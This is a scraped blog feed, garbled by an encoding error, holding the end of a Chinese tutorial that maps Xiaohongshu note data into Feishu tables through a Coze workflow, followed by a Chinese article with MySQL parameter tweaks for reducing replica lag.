<h3 data-id="heading-11">2.9. å°çº¢ä¹¦ç¬”è®°å†…å®¹è½¬æˆé£ä¹¦æ ¼å¼</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥æŠŠé‡‡é›†åˆ°çš„å°çº¢ä¹¦ç¬”è®°å†…å®¹è½¬æˆåç»­éœ€è¦ä½¿ç”¨çš„æ ¼å¼ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­ä¸‰æ–¹æ’ä»¶ã€å°çº¢ä¹¦å·¥å…·ç®±ã€‘çš„ã€xhs_note_to_jsonã€‘ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7592556df9d049349e40e7f1c1df163d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=lZoZY9AeeXlJJgKzk5ddOtCEu5c%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12">2.10. ç¬”è®°æ•°æ®è½¬æˆé£ä¹¦è¡¨æ ¼è®°å½•æ ¼å¼</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥æŠŠå°çº¢ä¹¦çš„ç¬”è®°æ•°æ®è½¬æˆéœ€è¦å†™å…¥å¤šç»´è¡¨æ ¼çš„æ•°æ®æ ¼å¼ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­ä¸‰æ–¹æ’ä»¶ã€é£ä¹¦å·¥å…·ç®±ã€‘çš„ã€data_to_feishuã€‘å·¥å…·ã€‚</p>
<p>è¿™ä¸ªå·¥å…·çš„åŸç†æ˜¯æŠŠå°çº¢ä¹¦çš„ç¬”è®°æ•°æ®ï¼Œé€šè¿‡æ˜ å°„è§„åˆ™ï¼Œæ˜ å°„åˆ°é£ä¹¦å¤šç»´è¡¨æ ¼çš„ä¸åŒå­—æ®µä¸Šé¢å»ï¼Œåªéœ€è¦ç¼–å†™æ˜ å°„çš„è§„åˆ™å³å¯ï¼Œè§£å†³ç¬”è®°æ•°æ®ä¸é£ä¹¦å¤šç»´è¡¨æ ¼å­—æ®µä¸åŒ¹é…çš„gapã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/acce6692be26442eaad04964f3c11826~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=i3GSTWxt6ivnJOuqrIspgiLeRtY%3D" alt="" loading="lazy"/></p>
<ul>
<li>æ˜ å°„è§„åˆ™ï¼Œç›´æ¥è´´è¿›rulesä¸­å³å¯ã€‚</li>
</ul>

<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"æ ‡é¢˜"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.note_title"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"ç¬”è®°ç±»å‹"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.type"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"ç‚¹èµæ•°"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.liked_count"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"è¯„è®ºæ•°"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.comment_count"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"æ”¶è—æ•°"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.collected_count"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"åˆ†äº«æ•°"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.share_count"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"é…å›¾"</span>,    <span class="hljs-string">"idx"</span>: 2,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.file_infos_json"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"è§†é¢‘åœ°å€"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.video_url"</span>,    <span class="hljs-string">"field_type"</span>: 15  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"æ ‡ç­¾åˆ—è¡¨"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.tag_list_str"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"ä½œè€…"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.nickname"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"å‘æ–‡æ—¶é—´"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.publish_time"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"å‘æ–‡ä½ç½®"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.ip_location"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"æ–‡æ¡ˆå†…å®¹"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.note_desc"</span>  }]</span>
</code></pre>
<h3 data-id="heading-13">2.11. æ›´æ–°è®°å½•åˆ°é£ä¹¦è¡¨æ ¼</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹çš„ä½œç”¨æ˜¯æŠŠæ•°æ®æ›´æ–°å›é£ä¹¦è¡¨æ ¼ä¸­ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­å®˜æ–¹æ’ä»¶ã€é£ä¹¦å¤šç»´è¡¨æ ¼ã€‘çš„ã€update_recordsã€‘å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8512e53586374a16bf1a8f98c717ddbe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=cZDzlxNBZ8tP37WNAQlTbxlMp8E%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">2.12. ç»“æŸ</h3>
<p>recordsæœ‰å†…å®¹è¯´æ˜æˆåŠŸï¼Œæ²¡æœ‰å†…å®¹è¯´æ˜å¤±è´¥ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9e123a6e6b34e56b29484bf97ba2cb4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=CQlTS1xtG1xR53UmGowcDJMRBdw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-15">3. æ€»ç»“</h2>
<p>å¯¹äºè¿™ç§æµç¨‹è¾ƒé‡çš„å·¥ä½œæµï¼Œä¸»è¦çš„éš¾ç‚¹è¿˜æ˜¯åœ¨æ•°æ®çš„å¤„ç†ä»¥åŠé£ä¹¦å¤šç»´è¡¨æ ¼çš„æƒé™é…ç½®ä¸Šï¼Œä¸è¿‡æƒé™çš„é…ç½®åªéœ€è¦é…ç½®ä¸€æ¬¡å°±å¯ä»¥ä¸€ç›´ä½¿ç”¨ï¼Œæ— éœ€é‡å¤é…ç½®ï¼Œå…³äºå¤šç»´è¡¨æ ¼æƒé™çš„é…ç½®ï¼Œå¯ä»¥çœ‹çœ‹æˆ‘æ–‡ç« å¼€å¤´è¯´çš„é‚£ä¸€ç¯‡æ–‡ç« ï¼Œé‚£ç¯‡æ–‡ç« å·²ç»è®²çš„æ¯”è¾ƒæ¸…æ¥šäº†ã€‚</p>
<p>æ•°æ®çš„å¤„ç†çš„è¯ï¼Œå°±æŒ‰ç…§æˆ‘æ–‡ç« è¿›è¡Œæ­å»ºå³å¯ï¼Œæœ‰é—®é¢˜å¯ä»¥è¯„è®ºåŒºç•™è¨€æˆ–è€…ç§ä¿¡æˆ‘ï¼Œçœ‹åˆ°éƒ½ä¼šç¬¬ä¸€æ—¶é—´å›å¤ã€‚</p>
<p>æœ¬æ–‡çš„åˆ†äº«å°±åˆ°è¿™é‡Œï¼Œå¦‚æœæ‚¨è§‰å¾—æœ‰æ”¶è·çš„è¯ï¼Œå¯ä»¥ç»™ä¸ªä¸€é”®ä¸‰è¿ï¼Œæ‚¨çš„é¼“åŠ±æ˜¯å¾é³´æŒç»­è¾“å‡ºçš„æœ€å¤§åŠ¨åŠ›ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/585825be7c6943a893ede74c18d24857~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=9r7ZTMDBylcqCggY3HAL3U7TEyE%3D" alt="" loading="lazy"/></p>
<p>æœ€è¿‘å®æˆ˜äº†ä¸€äº›æ‰£å­ï¼ˆCozeï¼‰å·¥ä½œæµç›¸å…³çš„æ¡ˆä¾‹ï¼ŒåŒ…å«å°çº¢è–¯å›¾æ–‡ç”Ÿæˆã€çˆ†æ¬¾è§†é¢‘å‰ªè¾‘ã€åŠå…¬ææ•ˆç­‰æ‰£å­æ¡ˆä¾‹ï¼Œå†…é™„è¯¦ç»†çš„æ•™ç¨‹å’Œå·¥ä½œæµå®‰è£…åŒ…ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥æ¥ä¸ª<strong>ä¸€é”®ä¸‰è¿ï¼ˆå¿…é¡»åŠ¨ä½œï¼‰</strong> ï¼Œæ–‡ç« è¯„è®ºåŒºè¯„è®ºâ€œ<strong>æ‰£å­æ¡ˆä¾‹</strong>â€é¢†å–ï¼ˆè¿™äº›æ¡ˆä¾‹ä¸åŒ…å«æœ¬æ–‡åˆ†äº«çš„æ¡ˆä¾‹ï¼Œå¦‚æœéœ€è¦æœ¬æ–‡åˆ†äº«çš„æ¡ˆä¾‹å®‰è£…åŒ…å¯ä»¥åå°ç§ä¿¡æˆ‘ï¼‰ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL ä¼˜åŒ–ä»åº“å»¶è¿Ÿçš„ä¸€äº›æ€è·¯]]></title>    <link>https://juejin.cn/post/7592515924700512291</link>    <guid>https://juejin.cn/post/7592515924700512291</guid>    <pubDate>2026-01-08T03:16:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592515924700512291" data-draft-id="7592500570167312419" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQL ä¼˜åŒ–ä»åº“å»¶è¿Ÿçš„ä¸€äº›æ€è·¯"/> <meta itemprop="keywords" content="MySQL,æ•°æ®åº“,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2026-01-08T03:16:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çˆ±å¯ç”Ÿå¼€æºç¤¾åŒº"/> <meta itemprop="url" content="https://juejin.cn/user/1480387593251847"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQL ä¼˜åŒ–ä»åº“å»¶è¿Ÿçš„ä¸€äº›æ€è·¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1480387593251847/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çˆ±å¯ç”Ÿå¼€æºç¤¾åŒº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:16:18.000Z" title="Thu Jan 08 2026 03:16:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä½œè€…ï¼šå­™ç»ªå®—ï¼Œæ–°æµªå¾®åš DBA å›¢é˜Ÿå·¥ç¨‹å¸ˆï¼Œä¸»è¦è´Ÿè´£ MySQLã€PostgreSQL ç­‰å…³ç³»å‹æ•°æ®åº“è¿ç»´ã€‚</p>
<p>çˆ±å¯ç”Ÿå¼€æºç¤¾åŒºå‡ºå“ï¼ŒåŸåˆ›å†…å®¹æœªç»æˆæƒä¸å¾—éšæ„ä½¿ç”¨ï¼Œè½¬è½½è¯·è”ç³»å°ç¼–å¹¶æ³¨æ˜æ¥æºã€‚</p>
<p>æœ¬æ–‡çº¦ 1000 å­—ï¼Œé¢„è®¡é˜…è¯»éœ€è¦ 3 åˆ†é’Ÿã€‚</p>
</blockquote>
<h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨æ•°æ®åº“è¿ç»´è¿‡ç¨‹ä¸­ï¼Œæ— è®ºæ˜¯è¿ç§»æ‰©å®¹è¿˜æ˜¯ç”Ÿäº§æŠ•é‡ï¼Œéƒ½å¿…ä¸å¯å°‘çš„ä¼šé‡åˆ°ä»åº“è¿ç§»è¿½ä¸ä¸Šçš„é—®é¢˜ã€‚è¿™äº›é—®é¢˜ä»¤äººå¤´ç–¼ã€‚</p>
<p>ä»¥ä¸‹åˆ—ä¸¾å‡ ä¸ªæˆ‘ä¸ªäººé‡åˆ°è¿‡çš„åŸå› ï¼š</p>
<ul>
<li><code>buffer_pool</code> è®¾ç½®è¿‡å¤§ï¼Œå¯¼è‡´ MySQL ä½¿ç”¨ SWAP</li>
<li>å¤‡ä»½å¯¼è‡´ SQL_THREAD å›æ”¾ç­‰å¾… MDL</li>
<li>å¤§äº‹åŠ¡</li>
<li>æ…¢æŸ¥è¯¢å¯¼è‡´ä»åº“æ€§èƒ½ä½ä¸‹</li>
<li>å¹¶è¡Œå¤åˆ¶å¯¼è‡´ä»åº“å»¶è¿Ÿç›‘æ§ä¸€ç›´ä¸º 1s</li>
<li>ç½‘ç»œé—®é¢˜</li>
</ul>
<p><em>å…·ä½“æƒ…å†µå…·ä½“åˆ†æï¼Œè¿™é‡Œä¸èµ˜è¿°ã€‚</em></p>
<p>å¦‚æœä½ åœ¨å¸¸è§„æ’æŸ¥ä¹‹åï¼Œä¾ç„¶æ— æ³•è§£å†³ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘å°†æ ¹æ®è‡ªèº«çš„ä¸€äº›ç»éªŒï¼Œæä¾›ä¸€äº›å‚æ•°è°ƒæ•´æ€è·¯ï¼Œä¾›å¤§å®¶å‚è€ƒã€‚</p>
<h2 data-id="heading-1">æ€è·¯ä¸€ï¼šsync ç›¸å…³</h2>
<p>æˆ‘ä»¬åœ¨è¿½å»¶è¿Ÿçš„æƒ…å†µï¼Œå¯ä»¥è°ƒæ•´ä¸€ä¸‹å‚æ•°ï¼Œå¢åŠ æ—¥å¿—è½ç›˜æ•ˆç‡ã€‚åç»­ä¸Šçº¿ä»åº“å¯ä»¥å†è®¾ç½®å›æ¥ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">sync_binlog</span>=<span class="hljs-number">0</span>
<span class="hljs-attr">sync_master_info</span>=<span class="hljs-number">10000</span> <span class="hljs-comment">#default</span>
<span class="hljs-attr">sync_relay_log</span>=<span class="hljs-number">10000</span> <span class="hljs-comment">#default</span>
<span class="hljs-attr">sync_relay_log_info</span>=<span class="hljs-number">10000</span> <span class="hljs-comment">#default</span>
</code></pre>
<h2 data-id="heading-2">æ€è·¯äºŒï¼šbuffer å’Œå¹¶å‘ç­‰ç›¸å…³</h2>
<p>å¯ä»¥è€ƒè™‘å¢åŠ ä¸€ä¸‹ <code>buffer_pool</code>ï¼ŒSQL_THREAD å›æ”¾æ‰§è¡Œçš„æ›´å¿«ã€‚</p>
<p>å¦‚æœå†…å­˜ç©ºé—´ä¸è¶³çš„è¯ï¼Œå¯ä»¥é€‚å½“è°ƒæ•´ <code>change buffer</code> çš„æ¯”ä¾‹ï¼ˆå‰ææ˜¯æ— è¯»ï¼Œæ­£å¸¸æƒ…å†µä¸‹å»¶è¿Ÿåº“å‡ä¸ºæ— ä¸šåŠ¡è¿æ¥ï¼‰ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">innodb_buffer_pool_size</span>=<span class="hljs-number">24</span>G <span class="hljs-comment">#24*1024*1024*1024</span>
<span class="hljs-attr">innodb_change_buffer_max_size</span>=<span class="hljs-number">50</span>
<span class="hljs-attr">innodb_thread_concurrency</span>=<span class="hljs-number">0</span>
<span class="hljs-attr">innodb_adaptive_hash_index</span>=<span class="hljs-number">0</span>
</code></pre>
<p>å¢å¤§ <code>innodb_buffer_pool_size</code> é£é™©ç‚¹ï¼š</p>
<ol>
<li>å†…å­˜è¿‡åº¦åˆ†é…å¯¼è‡´ SWAP è§¦å‘æˆ– OOMï¼Œéœ€é¢„ç•™è¶³å¤Ÿå†…å­˜ç»™ç³»ç»Ÿå’Œ MySQL å…¶ä»–ç»„ä»¶ï¼Œå»ºè®®ç¼“å†²æ± ä¸è¶…è¿‡ç‰©ç†å†…å­˜çš„ 70%ï¼›</li>
<li>è°ƒæ•´éœ€åˆ†æ­¥è¿›è¡Œï¼Œç»“åˆç³»ç»Ÿå†…å­˜ç›‘æ§ï¼Œé¿å…ä¸€æ¬¡æ€§è®¾ç½®è¿‡å¤§ã€‚</li>
</ol>
<h2 data-id="heading-3">æ€è·¯ä¸‰ï¼šslave ç›¸å…³</h2>
<h3 data-id="heading-4">è€ƒè™‘å¼€å¯å¹¶è¡Œå¤åˆ¶</h3>
<p>å¼€å¯å¹¶è¡Œå¤åˆ¶ï¼Œ8.0+ ç‰ˆæœ¬è€ƒè™‘ç”¨ writesetã€‚å¤åˆ¶çº¿ç¨‹å¯ä»¥å¤šè§‚å¯Ÿä¸€ä¸‹ï¼Œå¦‚æœæ²¡å¤Ÿçš„è¯ï¼Œå¯ä»¥è€ƒè™‘å¢åŠ ã€‚ä½†ä¸å»ºè®®è¶…è¿‡ CPU æ ¸å¿ƒæ•°æˆ–è€… <code>innodb_thread_concurrency</code> å‚æ•°å€¼ã€‚</p>
<p><code>slave_preserve_commit_order</code> ä¼šåŠ ä¸€å±‚é”ï¼Œè¿½å»¶è¿Ÿçš„æ—¶å€™å»ºè®®å…³é—­ï¼Œåç»­ä¸Šçº¿ä»åº“å¯ä»¥å†æ‰“å¼€ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">slave_parallel_type</span>=LOGICAL_CLOCK
<span class="hljs-attr">slave_parallel_workers</span>=<span class="hljs-number">16</span>
<span class="hljs-attr">slave_preserve_commit_order</span>=<span class="hljs-literal">OFF</span>
</code></pre>
<p><strong>ä¸ªäººä¸å»ºè®®ä¿®æ”¹ä»¥ä¸‹å‚æ•°</strong>ï¼Œæ€§èƒ½è™½ç„¶ä¼šæœ‰æ‰€å¢é•¿ï¼Œä½†åŒæ—¶ä¼šå¯¼è‡´ä¸»åº“ <code>commit</code> ç­‰å¾…ã€‚å½“ç„¶éƒ¨åˆ†éå®æ—¶ç±»ä¸šåŠ¡å¯ä»¥è°ƒæ•´ã€‚</p>
<p>binlog çš„ç»„æäº¤çš„ä¸¤ä¸ªæœ‰å…³å‚æ•°ï¼š</p>
<ul>
<li><code>binlog_group_commit_sync_delay</code> å‚æ•°ï¼Œè¡¨ç¤ºå»¶è¿Ÿå¤šå°‘å¾®ç§’åæ‰è°ƒç”¨ fsync åˆ·ç›˜ï¼›</li>
<li><code>binlog_group_commit_sync_no_delay_count</code> å‚æ•°ï¼Œè¡¨ç¤ºç´¯ç§¯å¤šå°‘æ¬¡ä»¥åæ‰è°ƒç”¨ fsyncã€‚</li>
</ul>
<h3 data-id="heading-5">è€ƒè™‘å…³é—­ log_slave_updates</h3>
<p><code>log_slave_updates</code> è¿™ä¸ªéœ€è¦é‡å¯ç”Ÿæ•ˆã€‚ä½†æ˜¯æœ‰ gdb ç»éªŒçš„å°ä¼™ä¼´å¯ä»¥ gdb ä¿®æ”¹ï¼Œä¸éœ€è¦é‡å¯ï¼Œåªéœ€è¦é‡å¯ slave å¤åˆ¶å³å¯ç”Ÿæ•ˆã€‚æ—  gdb ç»éªŒå¯èƒ½ä¼šå¯¼è‡´ crash ä¸å»ºè®®ã€‚</p>
<p>åŒæ—¶æ³¨æ„éœ€è¦äº†è§£æ¶æ„ï¼Œæ²¡æœ‰ binlog å¤‡ä»½æˆ–è€…çº§è”åº“ï¼Œä¸”æ— ä¸šåŠ¡è¿æ¥ï¼Œå»ºè®®å¯ä»¥å…³é—­ã€‚</p>
<h2 data-id="heading-6">æ€è·¯å››</h2>
<p>MGR æ¶æ„å¯ä»¥è€ƒè™‘å…ˆæ”¹ä¸ºå¼‚æ­¥å¤åˆ¶ï¼Œå…³é—­ <code>slave_preserve_commit_order</code>ï¼Œå¾…å»¶è¿Ÿè¿½å®Œåå†åŠ å…¥åˆ°é›†ç¾¤ã€‚</p>
<h2 data-id="heading-7">æ€è·¯äº”</h2>
<p>å…¶ä»–æ€§èƒ½å‚æ•°æŒ‰ç…§æ¨¡æ¿ç†è®ºä¸Šä¸ä¼šæœ‰å¤ªå¤§é—®é¢˜ï¼Œè¿™å¥—æ“ä½œä¸‹æ¥å»¶è¿Ÿå¤§æ¦‚ç‡ä¼šæœ‰æ‰€ä¸‹é™ï¼Œé™ä¸º 0 åªæ˜¯æ—¶é—´é—®é¢˜ã€‚</p>
<h2 data-id="heading-8">é™„å½•</h2>
<p>å¹¶è¡Œå¤åˆ¶ç§¯å‹æ—¥å¿—è§£æ:</p>
<pre><code class="hljs language-ini" lang="ini">2021-01-10T16:08:39.947611+08:00 85441 <span class="hljs-section">[Note]</span> Multi-threaded slave statistics for channel ''<span class="hljs-comment">;seconds elapsed = 120;events assigned = 4005889;worker queues filled over overrun level = 0;waited due a Worker queue full = 0;waited due the total size = 0;waited at clock conflicts = 6918018179200 waited (count) when Workers occupied = 0 waited when Workers occupied = 0</span>
--------------------------------
Multi-threaded slave statistics for channel â€:
seconds <span class="hljs-attr">elapsed</span> = <span class="hljs-number">120</span><span class="hljs-comment">; æ¯éš”120sè¾“å‡º</span>
<span class="hljs-attr">eventsassigned</span> = <span class="hljs-number">4005889</span><span class="hljs-comment">; æ€»å…±æœ‰å¤šå°‘ä¸ªeventè¢«åˆ†é…æ‰§è¡Œ</span>
queues filled over overrun <span class="hljs-attr">level</span> = <span class="hljs-number">0</span><span class="hljs-comment">; å¤šçº¿ç¨‹åŒæ­¥ä¸­ï¼Œworker çš„ç§æœ‰é˜Ÿåˆ—é•¿åº¦è¶…é•¿çš„æ¬¡æ•°</span>
waited due aWorker queue <span class="hljs-attr">full</span> = <span class="hljs-number">0</span><span class="hljs-comment">; å› ä¸ºworkerçš„é˜Ÿåˆ—è¶…é•¿è€Œäº§ç”Ÿç­‰å¾…çš„æ¬¡æ•°</span>
